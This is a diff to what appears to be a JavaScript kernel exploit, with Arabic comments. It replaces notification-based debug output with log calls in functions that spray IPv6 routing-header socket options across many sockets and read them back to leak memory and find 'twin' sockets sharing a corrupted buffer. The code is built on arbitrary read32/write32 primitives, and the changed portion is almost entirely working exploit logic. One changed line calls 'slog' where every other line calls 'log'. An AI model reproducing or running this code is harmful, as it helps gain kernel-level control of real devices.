@@ -237,43 +237,40 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   return read32(sockopt_len_ptr);
 }
 function set_rthdr(sd, buf, len) {
-    // دخول الدالة
-    send_notification("[MONITOR][set_rthdr] ENTER");
 
     // طباعة القيم الداخلة
-    send_notification("[MONITOR][set_rthdr] sd = " + sd);
-    send_notification("[MONITOR][set_rthdr] len = " + len);
+    log("[MONITOR][set_rthdr] sd = " + sd);
+    log("[MONITOR][set_rthdr] len = " + len);
 
     // طباعة أول 0x40 بايت من البافر
     var dump = "";
     for (var i = 0; i < Math.min(len, 0x40); i += 4) {
         dump += read32(buf.add(i)).toString(16).padStart(8, "0") + " ";
     }
-    send_notification("[MONITOR][set_rthdr] buffer_head = " + dump);
+    log("[MONITOR][set_rthdr] buffer_head = " + dump);
 
     // استدعاء الدالة الأصلية
     var ret = set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
 
     // طباعة النتيجة
-    send_notification("[MONITOR][set_rthdr] return = " + ret);
+    log("[MONITOR][set_rthdr] return = " + ret);
 
     // خروج الدالة
-    send_notification("[MONITOR][set_rthdr] EXIT");
+    slog("[MONITOR][set_rthdr] EXIT");
 
     return ret;
 }
 function get_rthdr(sd, buf, max_len) {
-    send_notification("[MONITOR][get_rthdr] ENTER");
 
-    send_notification("[MONITOR][get_rthdr] sd = " + sd);
-    send_notification("[MONITOR][get_rthdr] max_len = " + max_len);
+    log("[MONITOR][get_rthdr] sd = " + sd);
+    log("[MONITOR][get_rthdr] max_len = " + max_len);
 
     // قبل القراءة
     var before = "";
     for (var i = 0; i < Math.min(max_len, 0x40); i += 4) {
         before += read32(buf.add(i)).toString(16).padStart(8, "0") + " ";
     }
-    send_notification("[MONITOR][get_rthdr] buffer_before = " + before);
+    log("[MONITOR][get_rthdr] buffer_before = " + before);
 
     var ret = get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
 
@@ -282,10 +279,10 @@ function get_rthdr(sd, buf, max_len) {
     for (var i = 0; i < Math.min(max_len, 0x40); i += 4) {
         after += read32(buf.add(i)).toString(16).padStart(8, "0") + " ";
     }
-    send_notification("[MONITOR][get_rthdr] buffer_after = " + after);
+    log("[MONITOR][get_rthdr] buffer_after = " + after);
 
-    send_notification("[MONITOR][get_rthdr] return = " + ret);
-    send_notification("[MONITOR][get_rthdr] EXIT");
+    log("[MONITOR][get_rthdr] return = " + ret);
+    log("[MONITOR][get_rthdr] EXIT");
 
     return ret;
 }
@@ -810,7 +807,6 @@ function fill_buffer_64(buf, val, len) {
   }
 }
 function find_twins() {
-    send_notification("[TWINS] ENTER find_twins()");
     
     var count = 0;
     var val, i, j;
@@ -824,14 +820,12 @@ function find_twins() {
 
     while (count < MAX_ROUNDS_TWIN) {
 
-        send_notification("[TWINS] ---- ROUND " + count + " ----");
-
         // مراقبة حالة الذاكرة
         if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
             zeroMemoryCount++;
-            send_notification("[TWINS] memory low count = " + zeroMemoryCount);
+            log("[TWINS] memory low count = " + zeroMemoryCount);
             if (zeroMemoryCount >= 5) {
-                send_notification("[TWINS] memory low → cleanup + EXIT");
+                log("[TWINS] memory low → cleanup + EXIT");
                 cleanup();
                 return false;
             }
@@ -843,22 +837,22 @@ function find_twins() {
         for (i = 0; i < ipv6_socks.length; i++) {
 
             if (ipv6_socks[i].eq(BigInt_Error)) {
-                send_notification("[TWINS] skip sock " + i + " (invalid)");
+                log("[TWINS] skip sock " + i + " (invalid)");
                 continue;
             }
 
             var tag = (RTHDR_TAG | i);
 
-            send_notification("[TWINS] write32 tag=" + tag.toString(16) + " to sock " + i);
+            log("[TWINS] write32 tag=" + tag.toString(16) + " to sock " + i);
 
             write32(spray_add, tag);
             read32(spray_add); // memory barrier
 
-            send_notification("[TWINS] calling set_rthdr(sock=" + i + ")");
+            log("[TWINS] calling set_rthdr(sock=" + i + ")");
 
             var ret = set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
 
-            send_notification("[TWINS] set_rthdr ret=" + ret);
+            log("[TWINS] set_rthdr ret=" + ret);
         }
 
         // المرحلة الثانية: leak + البحث عن التوأم
@@ -868,13 +862,13 @@ function find_twins() {
 
             write32(leak_add, 0);
 
-            send_notification("[TWINS] calling get_rthdr(sock=" + i + ")");
+            log("[TWINS] calling get_rthdr(sock=" + i + ")");
 
             get_rthdr(ipv6_socks[i], leak_rthdr, 8);
 
             val = read32(leak_add);
 
-            send_notification("[TWINS] leak from sock " + i + " = " + val.toString(16));
+            log("[TWINS] leak from sock " + i + " = " + val.toString(16));
 
             j = val & 0xFFFF;
 
